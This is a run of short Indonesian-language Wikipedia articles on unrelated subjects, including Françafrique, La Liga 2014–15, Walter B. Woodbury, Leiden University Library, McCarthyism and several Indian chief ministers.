Mulanya, operasional SDIT Ar Raihan dilaksanakan di tiga tempat, yaitu di Dusun Sumberbatikan, Kelurahan Trirenggo (unit 1, kantor pusat), di Dusun Karangmojo, Kelurahan Trirenggo (unit 2), dan di Mandingdawang, Kelurahan Sabdodadi (unit 3). Ketiga unit tersebut berada di wilayah Kecamatan Bantul, Kabupaten Bantul, Provinsi Daerah Istimewa Yogyakarta. Pada perkembangan selanjutnya, sehubungan gedung unit 3 digunakan untuk operasional SMPIT Ar Raihan, mulai tahun ajaran 2013/2014 kegiatan belajar-mengajar SDIT Ar Raihan difokuskan di dua tempat, yaitu di Sumberbatikan (unit 1) dan Karangmojo (unit 2).

Pada tahun 2015, SDIT Ar Raihan ditunjuk sebagai sekolah siaga bencana oleh Pemerintah Provinsi Daerah Istimewa Yogyakarta melalui Badan Penanggulangan Bencana Daerah (BPBD) Provinsi Daerah Istimewa Yogyakarta bekerja sama dengan Badan Penanggulangan Bencana Daerah (BPBD) Kabupaten Bantul. Status sebagai sekolah siaga bencana ini diresmikan oleh Bupati Bantul, Hj. Sri Surya Widati, pada pada 18 Maret 2015.






</doc>
<doc id="1756079" url="https://id.wikipedia.org/wiki?curid=1756079" title="Françafrique">
Françafrique

Françafrique () adalah hubungan Prancis dengan bekas koloninya di Afrika. Istilah ini pertama kali digunakan secara positif oleh Presiden Félix Houphouët-Boigny dari Côte d'Ivoire, tetapi sekarang kadang digunakan untuk mengecam hubungan "neokolonial" antara Prancis dengan bekas koloninya. Lingkup pengaruh "Françafrique" sudah ada sejak zaman kolonisasi dan bergantung pada jaringan resmi dan bawah tanah. Sejak negara-negara Afrika merdeka tahun 1960, Prancis melakukan intervensi militer sebanyak 30 kali di Afrika. Fenomena ini terjadi di bekas koloni Prancis seperti Republik Kongo dan negara-negara penutur bahasa Prancis lain seperti Burundi dan Rwanda; fenomena ini juga dapat dijumpai di negara yang bukan penutur bahasa Prancis seperti Guinea Khatulistiwa. Prancis memiliki pangkalan militer di Gabon, Senegal, Djibouti, Mayotte, dan Réunion. Angkatan Darat Prancis diterjunkan di Mali, Chad, Republik Afrika Tengah, Somalia, dan Pantai Gading. Dari sudut pandang kritis, istilah "Françafrique" sering digunakan di media masa kini untuk menjelaskan hubungan ekonomi dan diplomatik yang rumit antara Prancis dengan bekas koloninya yang kadang dipandang sebagai negara boneka. Sejumlah pengamat mempertanyakan apakah "Françafrique" masih ada atau tidak di era pemerintahan Nicolas Sarkozy. Sejak 2012, banyak pengamat yang membahas "kembalinya Françafrique" pada masa pemerintahan François Hollande. Pada 14 Juli 2013, tentara dari 13 negara Afrika melakukan pawai bersama militer Prancis pada parade Hari Bastille di Paris untuk pertama kalinya sejak tentara kolonial Prancis dibubarkan.


Dokumenter:

Film:

Musik:

Literatur:



</doc>
<doc id="1756080" url="https://id.wikipedia.org/wiki?curid=1756080" title="La Liga 2014–15">
La Liga 2014–15

La Liga 2013–14 (atau "Liga BBVA" untuk alasan sponsor) adalah musim ke-84 dalam sejarah penyelenggaraan La Liga. Musim ini dimulai pada tanggal 23 Agustus 2014 dan berakhir pada 24 Mei 2015, dengan Atlético Madrid bertindak sebagai juara bertahan.

Barcelona meraih gelar juara ke-23nya pada tanggal 17 Mei 2015 setelah mengalahkan juara bertahan Atlético Madrid di Vicente Calderón Stadium.
Real Madrid, Atlético Madrid dan Valencia mendampingi Barcelona untuk berlaga dalam Liga Champions UEFA 2015–16, sedangkan Sevilla, Villarreal dan Athletic Bilbao berlaga dalam Liga Eropa UEFA 2015–16. Disisi lain Elche, Almería dan Córdoba terdegradasi ke Segunda División 2015–16, dan tempatnya digantikan oleh klub yang meraih promosi.

Cristiano Ronaldo menjadi pencetak gol terbanyak dengan 48 gol yang dibuatnya untuk Real Madrid, mengalahkan Lionel Messi yang mencetak 43 gol untuk Barcelona.

Secara keseluruhan, liga diikuti oleh 20 klub, terdiri atas 17 klub peserta La Liga 2013–14 dan tiga klub promosi dari Segunda División 2013–14 yaitu Eibar dan Deportivo La Coruña serta Córdoba yang memenangkan playoff promosi melawan Las Palmas.

Eibar memainkan debut La Liganya pada musim ini, Deportivo La Coruña kembali promosi setelah musim sebelumnya mengalami degradasi dari La Liga 2012–13 sedangkan Córdoba kembali ke La Liga setelah 42 tahun berlaga di divisi bawah.

 

Piala Pichichi diberikan oleh surat kabar "Marca" kepada penyerang yang mencetak gol terbanyak dalam satu musim.

Piala Zamora diberikan oleh surat kabar "Marca" kepada penjaga gawang dengan rasio gol kemasukan per pertandingan yang terendah. Penjaga gawang harus telah memainkan setidaknya 28 pertandingan dalam 60 menit atau lebih untuk ikut dalam perhitungan yang dilakukan oleh Marca.

 





 


</doc>
<doc id="1756083" url="https://id.wikipedia.org/wiki?curid=1756083" title="Daftar Ketua Menteri Mizoram">
Daftar Ketua Menteri Mizoram

Ketua Menteri Mizoram adalah ketua eksekutif di negara bagian timur laut India Mizoram. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Mizoram, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1963, lima orang dari empat partai telah menjabat sebagai Ketua Menteri Mizoram; pemegang jabatan pertamanya adalah Ch. Chhunga. Petahana saat ini adalah Pu Lalthanhawla dari Kongres Nasional India, yang menjabat sejak 7 Desember 2008. Ia juga merupakan ketua menteri Mizoram yang paling lama menjabat, dengan total masa jabatan selama 17 tahun.



</doc>
<doc id="1756085" url="https://id.wikipedia.org/wiki?curid=1756085" title="Juglans">
Juglans

Pohon buah kenari atau Juglans adalah sebuah genus tumbuhan dari keluarga Juglandaceae, yang biji-bijinya dikenal sebagai buah kenari. Mereka adalah pohon deciduous, yang memiliki tinggi , dengan daun-daun pinnate seukuran 

21 spesies dalam genus tersebut tersebar di wilayah utara Dunia Lama dari tenggara Eropa sampai timur Jepang, dan di Dunia Baru dari tenggara Kanada sampai Barat California dan selatan Argentina.

Nama genus "Juglans" berasal dari kata Latin "jūglans", yang artinya 'buah kenari, pohon buah kenari'; "jūglans" berasal dari turunan "Jōvis glans", 'kacang dari [dewa] Jupiter'.





</doc>
<doc id="1756090" url="https://id.wikipedia.org/wiki?curid=1756090" title="Rijksmonument">
Rijksmonument

Rijksmonument () adalah sebuah situs warisan nasional di Belanda, yang didaftarkan oleh agensi Rijksdienst voor het Cultureel Erfgoed (RCE) yang bertindak untuk Kementerian Pendidikan, Budaya dan Ilmu Pengetahuan Belanda.

Beberapa tontonan wisatawan Belanda adalah rijksmonuments, seperti kastil atau kincir angin. Beberapa kincir angin terkenal adalah De Schoolmeester, Westzaan, sebuah kincir angin di Noord Holland, satu-satunya kincir angin yang ada di pabrik kertas di dunia, yang didaftarkan sebagai rijksmonument nomor 40013; De Wieker Meule, De Wijk, di provinsi Drenthe, dibangun pada 1829 dan direstorasi dalam rangka pengerjaan, didaftarkan sebagai rijksmonument nomor 39657; dan Mellemolen, sebuah kincir angin di Friesland, juga direstorasi dalam rangka pengerjaan, didaftarkan sebagai rijksmonument nomor 35937.
Beberapa rijksmonument juga meliputi beberapa gereja, seperti Gereja Santo Remigius, Simpelveld, di provinsi Limburg, yang dibangun pada 1921 dan dengan sebuah penemuan yang berasal dari 1500.








</doc>
<doc id="1756092" url="https://id.wikipedia.org/wiki?curid=1756092" title="Internationale Koloniale en Uitvoerhandel Tentoonstelling">
Internationale Koloniale en Uitvoerhandel Tentoonstelling

Internationale Koloniale en Uitvoerhandel Tentoonstelling atau Exposition Universelle Coloniale et d'Exportation Générale (Pameran Kolonial dan Ekspor Internasional) adalah sebuah pameran kolonial (sejenis Pameran Dunia) yang diadakan di Amsterdam dari 1 Mei sampai 1 Oktober 1883. Acara tersebut dihadiri setidaknya sejuta pengunjung dan menjadi pameran kolonial internasional pertama, dengan 28 negara yang berbeda mewakili perdagangan dan kesejahteraan kolonial mereka.

Acara tersebut merupakan gagasan dari Edouard Agostini, seorang wirausahawan Prancis. Agostini, yang sebelumnya terlibat dalam penyelenggaraan Exposition Universelle pada 1878 di Paris, mempersembahkan rencana-rencananya untuk kota Amsterdam dan Raja William III dari Belanda pada 1880.

Lokasi yang dipilih untuk pameran tersebut adalah sebuah wilayah lahan yang tidak dipakai di belakang Rijksmuseum, yang pada waktu itu masih dibangun. Wilayah tersebut sekarang menjadi lapangan Museumplein. Bangunan utamanya dirancang oleh arsitek Prancis Paul Fouquiau dengan gaya "Moorish". Bangunan tersebut berisi paviliun-paviliun yang mewakili 28 negara yang berbeda, yakni Prancis, Jerman, Britania Raya, Belgia, Jepang, Amerika Serikat, China, Kanada, Kekaisaran Ottoman, Siam (Thailand), Transvaal, dan negara tuan rumahnya, Belanda.





</doc>
<doc id="1756098" url="https://id.wikipedia.org/wiki?curid=1756098" title="Walter B. Woodbury">
Walter B. Woodbury

Walter Bentley Woodbury (26 Juni 1834 – 5 September 1885) adalah seorang penemu dan pelopor fotografer Inggris. Ia adalah salah satu fotografer terawal di Australia dan Hindia Belanda (sekarang bagian dari Indonesia). Ia juga mempatenkan sejumlah penemuan yang berkaitan dengan berbagai aspek dari fotografi, penemuan terkenalnya adalah proses fotomekanik woodburytype.

Walter B. Woodbury lahir di Manchester, Inggris pada 26 Juni 1834. Sebagai murid dari seorang teknisi sipil di Manchester, ia membuat aobskura kamera miliknya sendiri dari kotak-kotak rokok dan lensa-lensa kacamata.

Pada 1851 Woodbury, yang menjadi fotografer profesional, datang ke Australia dan menemukan pekerjaan di departemen teknik pengerjaan air Melbourne. Ia memfoto konstruksi dok-dok dan pengerjaan air lainnya serta berbagai bangunan di Melbourne. ia mendapatkan sebuah medali karena fotografinya pada 1854.

Pada beberapa kesempatan pada pertengahan 1850an, Woodbury bertemu dengan fotografer ekspatriat Britania James Page. Pada 1857, keduanya meninggalkan Melbourne dan pindah ke Batavia (sekarang Jakarta), Hindia Belanda, datang pada 18 Mei 1857, dan mendirikan kemitraan "Woodbury & Page" pada tahun yang sama.
Pada 1858, "Woodbury & Page" melakukan pemotretan di Jawa Tengah dan Timur, menghasilkan pemandangan-pemandangan besar dari reruntuhan candi di dekat Surakarta, dan subyek-subyek lainnya, sebelum 1 September pada tahun tersebut. Setelah kunjungan mereka ke Jawa, pada 8 Desember 1858 Woodbury dan Page datang ke Batavia.

Pada 1859, Woodbury kembali ke Inggris untuk membawakan suplai-suplai reguler dari bahan-bahan fotografi untuk studio fotografinya dan ia mengkontrak firma London "Negretti and Zambra" untuk memasarkan foto-foto "Woodbury & Page" di Inggris.

Woodbury kembali ke Jawa pada 1860 dan pada tahun tersebut bersama dengan Page mengunjungi Jawa Tengah dan Jawa Barat bersama dengan Walter bersaudara, Henry James Woodbury (lahir 1836 – meninggal 1873), yang datang ke Batavia pada April 1859.

Pada 18 Maret 1861 "Woodbury & Page" berpindah ke tempat baru, yang juga berada di Batavia, dan studio tersebut berganti nama menjadi "Photographisch Atelier van Walter Woodbury", juga juga dikenal sebagai "Atelier Woodbury". Firma tersebut menjual potret-potret, pemandangan Jawa, stereografi, kamera, lensa, bahan-bahan kimia untuk fotografi dan bahan-bahan fotografi lainnya. Tempat tersebut digunakan sampai 1908, ketika firma tersebut dibubarkan.

Dalam kariernya, Woodbury menghasilkan topografi, etnografi dan khususnya fotografi potret. Ia melakukan pemotretan di Australia, Jawa, Sumatra, Kalimantan dan London. Meskipun fotografer-fotografer individual umumnya teridentifikasi pada foto-foto "Woodbury & Page", antara 1861 dan 1862 Walter B. Woodbury secara khusus menandai foto-fotonya: "Photographed by Walter Woodbury, Java".

Pada akhir Januari atau awal Februari 1863, Woodbury meninggalkan Jawa untuk kembali ke Inggris, karena alasan kesehatan.

Saat kembali ke Inggris, Woodbury menemukan proses reproduksi fotomekamik woodburytype, yang ia patenkan pada 1864. Antara 1864 dan 1885 Woodbury memiliki lebih dari 30 paten di Britania dan penemuan-penemuannya berkaitan dengan fotografi balon, transparansi, film-film yang disensitiskan dan pengaruh dalam lentera optik dan stereoskop. Selain penemuan-penemuannya, Woodbury menghasilkan foto-foto yang mendokumentasikan kemiskinan di London.

Pada 1865, proses Woodburytype-nya dikembangkan oleh Photo Relief Company, kemudian oleh Woodbury Permanent Photographic Printing Company dan kemudian oleh penerus perusahaan lainnya di Britania dan tempat lainnya.

Walter B. Woodbury meninggal pada 5 September 1885 ketika hari libur di Margate, Inggris. ia dimakamkan di Pemakaman Taman Abney di Stoke Newington yang dekat dengan London dimana monumen keluarganya berdiri sampai hari ini.



</doc>
<doc id="1756101" url="https://id.wikipedia.org/wiki?curid=1756101" title="Tarun Gogoi">
Tarun Gogoi

Tarun Gogoi () () adalah seorang politikus India yang menjabat sebagai Ketua Menteri Assam sejak 2001. Ia adalah anggota Kongres Nasional India dan memimpin partai tersebut pada tiga kemenangan pemilihan konsekutif di Assam. Ia menyelesaikan 13 tahun konsekutif sebagai Ketua Menteri Assam pada 18 Mei 2014.

Lahir pada 1 April 1936 dalam sebuah keluarga beretnis Tai-Ahom di Rangajan Tea Estate, Distrik Sivasagar, sekarang Distrik Jorhat di Assam.

Ayahnya, Dr Kamaleshwar Gogoi adalah seorang praktisioner pengobatan di Rangajan Tea Estate dan ibunya, Usha Gogoi, adik dari seorang penyair, Ganesh Gogoi, dikenal karena koleksi puisinya, Hiyar Samahar (Bendahara Hati).

Dipanggil Punakon oleh orangtuanya, Tarun Gogoi memulai pendidikan dasarnya di No.26 Rangajan Nimna Buniyadi Vidyalaya (sekolah yayasan rendah). Dari sana, ia pindah ke Sekolah Jorhat Madrassa di mana ia belajar sampai kelas IV, dan kemudian berpindah ke Sekolah Tinggi Bholaguri yang terletak di dekat Badulipar Tea Estate di mana ia belajar sampai kelas VI. pada 1949, Gogoi muda masuk ke Sekolah Tinggi Pemerintah Jorhat, di mana ia mengikuti ujian kelulusan HSLC. Ia lulus dari Kolese Jagannath Barooah, yang terletak di Distrik Jorhat, Assam dan setelah ia dan setelah ia mendapatkan LLB dari Universitas Gauhati, Assam. Ia adalah seorang alumnus dari Kolese Jagannath Barooah yang prestisius, Jorhat.

Tarun Gogoi menikah dengan Dolly Gogoi pada 30 Juli 1972. Dolly Gogoi adalah seorang pasca-kelulusan dalam bidang Zoologi dari Universitas Gauhati. Mereka memiliki dua anak; seorang putri yang bernama Chandrima yang menjadi seorang MBA dan seorang putra yang bernama Gaurav Gogoi yang menjadi seorang anggota parlemen dari Kaliabar, yang memegang sebuah gelar dalam bidang Administrasi Publik dari Universitas New York.

Gogoi telah menjabat enam kali sebagai Anggota Parlemen (AP) dari Lok Sabha. Ia pertama kali mewakili Jorhat pada 1971–85. Kemudian Gogoi terpilih dari Kaliabor (1991–96/1998–2002). Kursi Kaliabor sekarang diduduki oleh adik sepupunya Dip Gogoi.


</doc>
<doc id="1756103" url="https://id.wikipedia.org/wiki?curid=1756103" title="Gorredijk">
Gorredijk

Gorredijk () adalah kota terbesar di munisipalitas Opsterland, di provinsi Belanda Friesland. Gorredijk memiliki penduduk berjumlah 7,369 orang pada 2014.

Gorredijk adalah tempat dari lima sekolah dasar: "de Vlieger", "de Tsjerne", "de Flambou", "Trimbeets", dan "de Librije", sebuah sekolah Kristen Protestan. "Sekolah Burgemeester Harmsma" adalah sekolah menengah tunggal di kota tersebut, sementara kebanyakan muridnya berasal dari Heerenveen ( dari barat daya) dan Drachten ( dari utara) untuk pendidikan tertiari.

Penduduk Gorredijk terkenal adalah:


</doc>
<doc id="1756105" url="https://id.wikipedia.org/wiki?curid=1756105" title="Raamsdonkveer">
Raamsdonkveer

Raamsdonksveer adalah sebuah kota di munisipalitas Belanda Geertruidenberg, Brabant Utara. Kota tersebut berada di sisi timur Donge yang berseberangan dengan Geertruidenberg. Kota tersebut adalah pusat wilayah komersioal dan industri.

Raamsdonksveer bersebelahan dengan Oosterhout dan Hank. Sebelum 1950, kota tersebut memiliki sebuah stasiun jalur kereta api kecil.


</doc>
<doc id="1756106" url="https://id.wikipedia.org/wiki?curid=1756106" title="Daftar Ketua Menteri Manipur">
Daftar Ketua Menteri Manipur

Ketua Menteri Manipur adalah ketua eksekutif di negara bagian timur laut India Manipur. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, tetapi otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Manipur, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1963, sebelas orang telah menjabat sebagai Ketua Menteri Manipur. Lima orang diantaranya berasal dari Kongres Nasional India, termasuk pemegang jabatan pertama Mairembam Koireng Singh dan petahana saat ini Okram Ibobi Singh, yang menjabat sejak 2 Maret 2002.


</doc>
<doc id="1756107" url="https://id.wikipedia.org/wiki?curid=1756107" title="Perkumpulan Geografi Kerajaan Belanda">
Perkumpulan Geografi Kerajaan Belanda

Perkumpulan Geografi Kerajaan Belanda, atau "Koninklijk Nederlands Aardrijkskundig Genootschap" (KNAG) dalam bahasa Belanda, adalah sebuah organisasi geografer dan orang-orang yang mengetahui geografi di Belanda. Organisasi tersebut memiliki sekitar 4000 anggota dan pengajar pendukung pada bidang geografi. Organisasi tersebut menerbitkan sebuah majalah ilmu pengetahuan, "Tijdschrift voor economische en sociale geografie" (Jurnal Geografi Ekonomi & Sosial) dan Nederlandse Geografische Studies atau NGS (Studi-Studi Geografi Belanda). Organisasi tersebut juga memiliki koleksi besar dari sekitar 135,000 peta dan 4500 atlas yang disimpan di sebuah perpustakaan di Universitas Amsterdam sejak 1880.

Organisasi tersebut didirikan pada 1873 setelah pendirian organisasi yang sama di Prancis pada 1821 (Société de Géographie) dan Britania Raya pada 1830 ( Royal Geographical Society). Pieter Johannes Veth adalah ketua pertama dari KNAG. Organisasi tersebut menyelenggarakan beberapa ekspedisi ke Suriname, pulau-pulau di kepulauan Hindia Belanda, Afrika Selatan dan sempat mengunjungi suku-suku asli di Amerika Utara. Kebanyakan ekspedisinya diikuti oleh para ilmuwan dari bidang-bidang yang berbeda, seorang fotografer dan seorang perwira angkatan laut. Terkadang bantuan militer besar diikutkan jika ekspedisinya dilakukan di sebuah wilayah yang sangat berbahaya.

Anggota organisasi tersebut tidak hanya para ilmuwan. Elit politik dan elit komersial (banker, pemilik pabrik, pemilik kapal dan kapten kapal dagang) juga menjadi anggota-nya. Organisasi tersebut memiliki sebuah agenda ekonomi serta misi ilmu pengetahuan.

Ketika koloni-koloni Belanda meraih kemerdekaan, karya-karya KNAG kurang berfokus pada masalah-masalah ekonomi dan menjadi lebih berkonsentrasi dengan pertanyaan-pertanyaan ilmu pengetahuan. Hindia Belanda merdeka pada 1949 dan Nugini Belanda merdeka pada 1962. Ekspedisi KNAG terakhir adalah pada 1959 di Nugini Belanda.



</doc>
<doc id="1756108" url="https://id.wikipedia.org/wiki?curid=1756108" title="Perpustakaan Universitas Leiden">
Perpustakaan Universitas Leiden

Perpustakaan Universitas Leiden adalah sebuah perpustakaan yang didirikan pada 1575 di Leiden, Belanda. Tempat tersebut dianggap sebagai sebuah tempat yang signifikan dalam perkembangan budaya Eropa: tempat tersebut merupakan bagian dari sejumlah kecil pusat kebudayaan yang memberikan kelangsungan pengembangan dan penyebaran pengetahuan pada Zaman Pencerahan. Benda-benda yang disimpan meliputi sekitar 5,200,000 volume, 1,000,000 e-book, 20,000 serial saat ini, 40,000 e-jurnal, 60,000 manuskrip Barat dan Timur, 500,000 pesan, 100,000 peta, 100,000 cetakan, 12,000 gambar dan 300,000 foto. Perpustakaan tersebut memiliki koleksi terbesar di seluruh dunia tentang Indonesia dan Caribbean. Selain itu, Perpustakaan Universitas Leiden adalah satu-satunya organisasi warisan di Belanda dengan dua dokumen yang diinskripsikan dalam Pendaftaran Memori Dunia UNESCO.

Sejak pendirian universitas tersebut pada 1575, terdapat 25 pustakawan di Universitas Leiden:


1587-1595: Academiegebouw, Rapenburg 73, Leiden.

1595-1983: Faliede Bagijnkerk, Perpustakaan Universitas Lama, sekarang: Badan Universitas, Rapenburg 70, Leiden.





</doc>
<doc id="1756109" url="https://id.wikipedia.org/wiki?curid=1756109" title="Devendra Fadnavis">
Devendra Fadnavis

Devendra Gangadharrao Fadnavis kelahiran 22 Juli 1973) adalah Ketua Menteri Maharashtra ke-18 dan saat ini di India. Ia adalah anggota Partai Bharatiya Janata (PBJ) & RSS dan juga presiden unit negara bagian Maharashtra dari PBJ dan AML Maharashtra dari Nagpur Barat Daya.

Karier politiknya dimulai saat ia berumur sembilan belas tahun ketika ia menjadi Presiden Bharatiya Janata Yuva Morcha (sayap pemuda PBJ) di Maharashtra. Pada usia 21 tahun, Fadnavis menjadi korporator munisipal termuda di Korporasi Munisipal Nagpur dan menjabat sebagai korporator untuk dua masa jabatan konsekutif, pada 1992 dan 1997. Ia menjadi wali kota termuda kedua yang terpilih di India, ketika ia menjabat sebagai Wali kota Nagpur pada usia 27 tahun, pada 1997. Ia juga satu-satunya orang yang terpilih kembali sebagai Wali Kota dalam Dewan Negara Bagian Maharashtra.

Fadnavis lahir dalam sebuah keluarga Brahmin Deshastha Maharashtrian dari pasangan Sarita Fadnavis, seorang pembuat rumah dan mantan direktur Perhimpunan Kredit Perumahan Vidarbha, dan Gangadhar-rao Fadnavis, anggota Dewan Legislatif Maharashtra sebanyak dua kali dari Nagpur (pertama dengan Jan Sangh, lalu Partai Janata, dan kemudian dengan PBJ). Bibi Fadnavis Shobhatai Fadnavis adalah politikus veteran lainnya dalam keluarganya, yang terikat dengan Partai Bharatiya Janata. Ia adalah seorang menteri dalam pemerintahan Shiv Sena-PBJ pada 1995; ia sekarang menjadi anggota dewan legislatif negara bagian tersebut.

Devendra Fadnavis menikah dengan Amruta Ranade pada 2006. Mereka memiliki seorang putri yang bernama Divija. Amruta Ranade adalah seorang Wakil Presiden Bank Axis di Nagpur. Ranade berasal dari keluarga non-politik. Orangtuanya adalah dokter di Nagpur.


</doc>
<doc id="1756110" url="https://id.wikipedia.org/wiki?curid=1756110" title="Kulit Maroko">
Kulit Maroko

Kulit Maroko (juga Levant atau Maroko atau Maroquin dalam bahasa Prancis atau Saffian dalam bahasa Jerman atau Saxtag dalam bahasa Persia Tengah dan سختگ dalam bahasa Persia modern) adalah sebuah bentuk kulit yang lembut yang digunakan untuk membuat sarung tangan dan sepatu, namun secara tradisional dikaitkan dengan penjilidan buku.

Awalnya kulit Maroko dibawa dari Maroko, dan dari akhir abad ke-16 digunakan dalam penjilidan buku di negara-negara Barat karena kekuatannya.



</doc>
<doc id="1756111" url="https://id.wikipedia.org/wiki?curid=1756111" title="McCarthyisme">
McCarthyisme

McCarthyisme adalah praktik membuat tuduhan subversi atau pengkhianatan tanpa mempertimbangkan bukti. Istilah ini juga berarti "praktik membuat tuduhan tak adil atau menggunakan teknik penyelidikan tak adil untuk mencegah penolakan dan kritik politik." Istilah ini muncul ketika Amerika Serikat mengalami Ancaman Merah Kedua yang berlangsung sejak 1950 sampai 1956 dan dipenuhi tekanan politik terhadap kaum komunis, serta kampanye rasa takut akan pengaruh komunisme terhadap lembaga-lembaga Amerika Serikat dan spionase oleh agen-agen Soviet. Istilah ini awalnya dicetuskan untuk mengkritik upaya anti-komunis Senator A.S. dari Partai Republik Joseph McCarthy dari Wisconsin. "McCarthyisme" pun segera meluas maknanya untuk menyebut upaya sejenis yang dilakukan secara berlebihan. Istilah ini mulai digunakan secara umum untuk menyebut tuduhan sembrono tanpa dasar serta serangan demagogik terhadap karakter atau patriotisme saingan politik.

Pada masa McCarthy, ribuan orang Amerika Serikat dituduh komunis atau simpatisan komunis dan menjadi subjek penyelidikan agresif dan interogasi di hadapan panel, komite, dan lembaga pemerintah atau swasta. Target utama dugaan komunis ini adalah karyawan pemerintah, terutama karyawan industri hiburan, pengajar, dan aktivis serikat pekerja. Tuduhan komunis biasanya dianggap benar meski buktinya tidak lengkap atau dipertanyakan, dan level ancaman dalam keterkaitan atau kepercayaan kiri seseorang (baik asli atau dugaan saja) seringkali dilebih-lebihkan. Banyak orang yang kehilangan pekerjaan dan/atau kariernya hancur; beberapa di antaranya bahkan dipenjara. Sebagian besar hukuman lewat sidang pengadilan ini akhirnya dibatalkan, hukum-hukumnya dinyatakan tidak konstitusional, penolakan atas alasan tak jelas dianggap ilegal atau dapat ditindaklanjuti, atau prosedur luar hukum yang semakin tidak populer.

Contoh terkenal McCarthyism adalah pidato, investigasi, dan sidang dengar pendapat Senator McCarthy itu sendiri; daftar hitam Hollywood yang dikaitkan dengan sidang dengar pendapat oleh House Un-American Activities Committee (HUAC); dan berbagai aktivitas anti-komunis Federal Bureau of Investigation (FBI) di bawah kepemimipinan Direktur J. Edgar Hoover. McCarthyisme merupakan fenomena sosial dan budaya besar yang berdampak pada seluruh ranah masyarakat dan menjadi sumber perdebatan dan konflik utama di Amerika Serikat.

Sejumlah tokoh terkenal yang pernah masuk daftar hitam atau mengalami pengucilan pada masa McCarthyism adalah:





</doc>
<doc id="1756113" url="https://id.wikipedia.org/wiki?curid=1756113" title="Arsitektur Kebangkitan Gotik">
Arsitektur Kebangkitan Gotik

Kebangkitan Gotik (juga disebut sebagai Gotik Viktoria, Neo-Gotik atau Gotik Jigsaw, dan ketika digunakan untuk banguann sekolah, kolese, dan universitas disebut sebagai Gotik Collegiate) adalah sebuah gerakan arsitektur yang dimulai pada akhir 1740-an di Inggris. Popularitasnya berkembang dengan cepat pada awal abad ke-19.

Arsitektur Gotik dimulai di Basilika Santo Denis di dekat Paris, dan Katedral Sens pada 1140





</doc>
<doc id="1756114" url="https://id.wikipedia.org/wiki?curid=1756114" title="Fotografi potret">
Fotografi potret

Fotografi potret atau portraiture adalah fotografi dari seorang tokoh atau sekelompok orang yang menyimpan ekspresi, kepribadian dan perasaan dari subyek tersebut. Seperti jenis potret lainnya, fokus dari fotografi tersebut biasanya wajah orang tersebut, meskipun seluruh bagian tubuh dan latar belakang atau konteks juga dapat dimasukkan.



</doc>
<doc id="1756120" url="https://id.wikipedia.org/wiki?curid=1756120" title="N. Rangaswamy">
N. Rangaswamy

N. Rangaswamy (kelahiran 4 Agustus 1950) adalah seorang politikus India yang sekarang menjadi Ketua Menteri Wilayah Persatuan Puducherry saat ini. Ia dipilih dari konstituensi mahkamah Thattanchavady.

N. Rangasamy lahir pada 4 Agustus 1950 di Pondicherry dari orangtuanya Nadesan Krishnasamy dan Panchali. Ia mendapatkan gelar Sarjana Komersial-nya di Kolese Seni Tagore dan B.L. di Kolese Hukum Dr. Ambedkar, Pondicherry.

Pemilihan pertamanya adalah kontes di konstituensi Thattanchavady pada 1990. Ia memenangkan pemilihan mahkamah 1991 dengan suara mayoritas dan dilantik sebagai Menteri Agribudaya dan Kerjsama. Ia kembali terpilih dari konstituensi yang sama pada 1996. Pada 2000, ia memegang jabatan Menteri Pariwisata, Pendidikan, Pelayanan Publik, Penerbangan Sipil dan Seni & Budaya. Pada Pemilihan Mahkamah 2001, ia menang di konstituensi Thattanchavady dan memegang jabatan Menteri Pekerjaan Publik, Agribudaya dan Kehutanan. Pada tahun yang sama, ia memegang jabatan Ketua Menteri Puducherry pada 27 Oktober.




</doc>
<doc id="1756123" url="https://id.wikipedia.org/wiki?curid=1756123" title="Daftar Ketua Menteri Himachal Pradesh">
Daftar Ketua Menteri Himachal Pradesh

Ketua Menteri Himachal Pradesh adalah ketua eksekutif di negara bagian utara India Himachal Pradesh. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Himachal Pradesh, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1952, lima orang telah menjadi Ketua Menteri Himachal Pradesh. Tiga orang diantaranya berasal dari partai Kongres Nasional India, termasuk pemegang jabatan pertama Yashwant Singh Parmar. Setelah masa jabatan pertamanya berakhir pada 1956, Himachal Pradesh menjadi wilayah persatuan, dan jabatan Ketua Menteri ditiadakan. Pada 1963, Parmar sekali lagi kembali menjadi Ketua Menteri, dan saat pengunduran dirinya, pada 1971, Himachal mendapatkan status negara bagian secara penuh. Ia masih menjadi ketua menteri yang paling lama menjabat di negara bagian tersebut. Sejak 1993, jabatan ketua menteri berpindah tangan setiap lima tahun antara Virbhadra Singh dari Kongres dan Prem Kumar Dhumal dari Partai Bharatiya Janata. Mantannya adalah petahana saat ini, yang dilantik pada 25 Desember 2012.



</doc>
<doc id="1756131" url="https://id.wikipedia.org/wiki?curid=1756131" title="Raghubar Das">
Raghubar Das

